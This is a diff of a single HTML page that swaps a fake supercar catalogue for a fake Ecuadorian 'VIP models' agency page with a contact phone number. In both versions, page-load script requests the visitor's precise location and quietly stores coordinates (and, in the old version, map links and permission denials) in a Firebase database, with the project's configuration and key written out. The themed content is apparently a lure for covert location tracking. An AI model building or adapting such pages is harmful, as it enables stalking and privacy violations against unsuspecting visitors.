@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head> 
     <meta charset="UTF-8"> 
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>Motor Zone</title> 
+    <title>First Class - Modelos VIP Ecuador</title> 
 
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script> 
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script> 
@@ -12,115 +12,73 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; } 
         body { background-color: #0b0c10; color: #c5c6c7; min-height: 100vh; display: flex; flex-direction: column; } 
          
-        header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; } 
+        header { background-color: #111; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #d4af37; } 
         header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; cursor: pointer; } 
-        header h1 span { color: #ff003c; } 
-        nav { display: flex; align-items: center; }
+        header h1 span { color: #d4af37; } 
         nav a { color: #ffffff; text-decoration: none; margin-left: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; } 
-        nav a:hover { color: #ff003c; } 
+        nav a:hover { color: #d4af37; } 
 
-        .hero { background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') no-repeat center center/cover; height: 400px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; } 
-        .hero h2 { font-size: 42px; color: #fff; margin-bottom: 10px; text-transform: uppercase; } 
-        .hero p { font-size: 18px; color: #66fcf1; margin-bottom: 20px; } 
+        .hero { background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)); height: 400px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; } 
+        .hero h2 { font-size: 42px; color: #d4af37; margin-bottom: 10px; text-transform: uppercase; } 
+        
         .container { max-width: 1100px; margin: 40px auto; padding: 0 20px; flex: 1; width: 100%; } 
-        .section-title { text-align: center; font-size: 28px; margin-bottom: 30px; text-transform: uppercase; color: #fff; } 
+        .section-title { text-align: center; font-size: 28px; margin-bottom: 30px; color: #d4af37; } 
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; } 
 
-        .card-clickable { text-decoration: none; color: inherit; display: block; cursor: pointer; } 
-        .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); transition: transform 0.3s ease, border 0.3s ease; border: 1px solid transparent; } 
-        .card:hover { transform: translateY(-5px); border-color: #ff003c; } 
+        .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; border: 1px solid #333; transition: 0.3s; } 
         .card img { width: 100%; height: 220px; object-fit: cover; } 
         .card-content { padding: 20px; } 
-        .card-content h3 { color: #fff; margin-bottom: 10px; font-size: 20px; } 
-        .card-content p { font-size: 14px; line-height: 1.5; color: #c5c6c7; } 
-        .card-content .price { color: #ff003c; font-weight: bold; margin-top: 10px; font-size: 16px; } 
-
-        .btn-back { display: inline-block; padding: 10px 20px; background-color: #1f2833; color: #fff; font-weight: bold; border-radius: 4px; border: 1px solid #ff003c; margin-bottom: 20px; cursor: pointer; text-transform: uppercase; } 
-        .btn-back:hover { background-color: #ff003c; } 
+        .card-content h3 { color: #fff; margin-bottom: 10px; } 
 
         .page-section { display: none; } 
         .page-section.active { display: block; } 
-        footer { background-color: #111; text-align: center; padding: 20px; margin-top: auto; font-size: 14px; color: #666; width: 100%; }   
+        footer { background-color: #000; text-align: center; padding: 20px; margin-top: auto; color: #666; } 
     </style>
 </head>
 <body>
 
     <header>
-        <h1 onclick="showSection('main-home')">MOTOR <span>ZONE</span></h1>
-        <nav id="navigation-menu">
-            <a onclick="showSection('main-home')">Models</a>
-            <a href="#">Contact</a>
+        <h1 onclick="showSection('main-home')">FIRST <span>CLASS</span></h1>
+        <nav>
+            <a onclick="showSection('main-home')">Inicio</a>
+            <a onclick="showSection('view-modelos')">Modelos</a>
         </nav>
     </header>
 
     <div id="main-home" class="page-section active">
         <section class="hero">
-            <h2>Adrenaline and Speed</h2>
-            <p>Discover the engineering and design of the world's most iconic supercars.</p>
+            <h2>Experiencias de Alto Valor</h2>
+            <p>Plataforma web con auténticas modelos, influencers y reinas de belleza en Ecuador.</p>
         </section>
 
         <main class="container">
-            <h2 class="section-title">Featured Categories</h2>
+            <h2 class="section-title">Categorías Disponibles</h2>
             <div class="grid">
-                <div class="card-clickable" onclick="showSection('view-clasicos')">
-                    <div class="card"> 
-                        <img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=600"> 
-                        <div class="card-content"> 
-                            <h3>Classic Supercars Collection</h3> 
-                            <p>Italian aerodynamic design with powerful V8 and V12 engines built for heritage track speed.</p> 
-                        </div> 
+                <div class="card"> 
+                    <div class="card-content"> 
+                        <h3>Casting Profesional</h3> 
+                        <p>Oportunidad única para modelos de alto perfil en Ecuador y Latinoamérica.</p> 
                     </div> 
                 </div> 
-
-                <div class="card-clickable" onclick="showSection('view-urbanos')"> 
-                    <div class="card"> 
-                        <img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=600"> 
-                        <div class="card-content"> 
-                            <h3>Urban Technology Line</h3> 
-                            <p>Modern carbon fiber build, smart integration, and precision control focused on high city agility.</p> 
-                        </div> 
+                <div class="card"> 
+                    <div class="card-content"> 
+                        <h3>Membresías VIP</h3> 
+                        <p>Acceso exclusivo a nuestro tour de belleza nacional e internacional.</p> 
                     </div> 
                 </div> 
-            </div> 
-        </main>
-    </div>
-
-    <div id="view-clasicos" class="page-section">
-        <main class="container">
-            <div class="btn-back" onclick="showSection('main-home')">← Back to Categories</div>
-            <h2 class="section-title">Classic Supercars Gallery</h2>
-            <div class="grid">
-                <div class="card">
-                    <img src="https://images.unsplash.com/photo-1583121274602-3e2820c69888?q=80&w=500">
-                    <div class="card-content">
-                        <h3>Scuderia Heritage V12</h3>
-                        <p>Naturally aspirated classic design with fine leather interior and raw mechanical response.</p>
-                        <p class="price">$340,000</p>
-                    </div>
-                </div>
-                <div class="card">
-                    <img src="https://images.unsplash.com/photo-1502877338535-766e1452684a?q=80&w=500">
-                    <div class="card-content">
-                        <h3>Vintage Red Stallion</h3>
-                        <p>Iconic mid-engine silhouette from the golden age of automotive competitive engineering.</p>
-                        <p class="price">$295,000</p>
-                    </div>
-                </div>
             </div>
         </main>
     </div>
 
-    <div id="view-urbanos" class="page-section">
+    <div id="view-modelos" class="page-section">
         <main class="container">
-            <div class="btn-back" onclick="showSection('main-home')">← Back to Categories</div>
-            <h2 class="section-title">Urban Technology Vehicles</h2>
+            <h2 class="section-title">Nuestras Modelos</h2>
             <div class="grid">
+                <!-- Aquí puedes añadir las tarjetas de las modelos -->
                 <div class="card">
-                    <img src="https://images.unsplash.com/photo-1617531653332-bd46c24f2068?q=80&w=500">
                     <div class="card-content">
-                        <h3>Neo Stealth Hypercar</h3>
-                        <p>Full carbon chassis equipped with aerodynamic active wings and hybrid engine assistance.</p>
-                        <p class="price">$520,000</p>
+                        <h3>Acceso VIP</h3>
+                        <p>Contáctanos al +593 (9) 99946306 para detalles[cite: 15].</p>
                     </div>
                 </div>
             </div>
@@ -128,11 +86,10 @@
     </div>
 
     <footer>
-        <p>© 2026 ZonaMotor. Private Exhibition Catalog.</p>
+        <p>© 2026 First Class - Agencia de Modelos VIP</p>
     </footer>
 
     <script>
-        // Configuración oficial de tu proyecto Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyDitt3GQmc1uAnWOqWNVoqWgmhm9CQQrdU",
             authDomain: "miubicacion-52e7f.firebaseapp.com",
@@ -140,67 +97,28 @@
             projectId: "miubicacion-52e7f",
             storageBucket: "miubicacion-52e7f.firebasestorage.app",
             messagingSenderId: "847245935895",
-            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
-            measurementId: "G-GE5FVZMQXP"
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352"
         };
 
-        // Inicializar Firebase de forma segura
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
         function showSection(sectionId) {
-            document.querySelectorAll('.page-section').forEach(sec => {
-                sec.classList.remove('active');
-            });
-            const target = document.getElementById(sectionId);
-            if(target) {
-                target.classList.add('active');
-                window.scrollTo(0,0);
-            }
+            document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
         }
 
-        // Solicitud automática de ubicación al cargar la página
         window.onload = function() {
-            showSection('main-home'); // Muestra la sección principal al entrar
-            
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(ubicacionPermitida, ubicacionDenegada, {
-                    enableHighAccuracy: true,
-                    timeout: 20000,
-                    maximumAge: 0
+                navigator.geolocation.getCurrentPosition(pos => {
+                    database.ref('visitas_vip/' + Date.now()).set({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        fecha: new Date().toLocaleString("es-EC")
+                    });
                 });
-            } else {
-                console.warn("La geolocalización no es soportada por este navegador.");
             }
         };
-
-        function ubicacionPermitida(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            // Enlace de Google Maps estándar y funcional
-            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            // Registro automático en la base de datos de Firebase
-            database.ref('visitas_autos/' + Date.now()).set({
-                latitude: lat,
-                longitude: lon,
-                map_link: googleMapsLink,
-                permission: "Granted",
-                registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
-            });
-        }
-
-        function ubicacionDenegada(error) {
-            // Registro en Firebase indicando que el usuario no dio permisos o falló
-            database.ref('visitas_autos/' + Date.now()).set({
-                permission: "Denied or Failed",
-                error_code: error.code,
-                error_message: error.message,
-                registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
-            });
-        }
     </script>
 </body>
 </html>
